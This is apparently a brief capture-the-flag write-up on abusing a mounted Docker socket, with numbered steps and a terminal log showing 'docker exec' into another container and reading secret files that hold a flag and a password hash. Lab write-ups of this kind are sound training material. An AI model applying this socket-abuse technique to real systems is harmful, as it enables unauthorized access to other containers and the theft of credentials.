1. container scan with deepce https://github.com/stealthcopter/deepce

2. Docker sock is mounted, so look for exploits 

3. install docker cli with apt (apt install docker.io)

4. Now interaction with the docker sock is possible 

root@1nmyd0ck3r:~# docker ps
CONTAINER ID   IMAGE            COMMAND                  CREATED          STATUS          PORTS     NAMES
f9e497f4ce2d   docker_flag      "/bin/sh"                13 minutes ago   Up 13 minutes             docker_flag
76b79677e3cc   docker_escape2   "/bin/sh -c '/etc/in…"   4 months ago     Up 13 minutes             escape2


docker_flag is the interesting container


root@1nmyd0ck3r:~# docker exec -it docker_flag sh
/ # ls
bin     dev     etc     home    lib     media   mnt     opt     passwd  proc    root    run     sbin    srv     sys     tmp     usr     var
/ # cat passwd 
19c948928a782b907614aa8a4ef92570
/ # cat /opt/notes/
cat: read error: Is a directory
/ # cat /opt/notes/
.passwd   note.txt
/ # cat /opt/notes/.passwd 
You got Me ! This is the flag : f4f179a78dae34be3e474d9b3f258da6
/ # cat /opt/notes/note.txt 
Hey mate, nice to meet you here ! :)
/ #
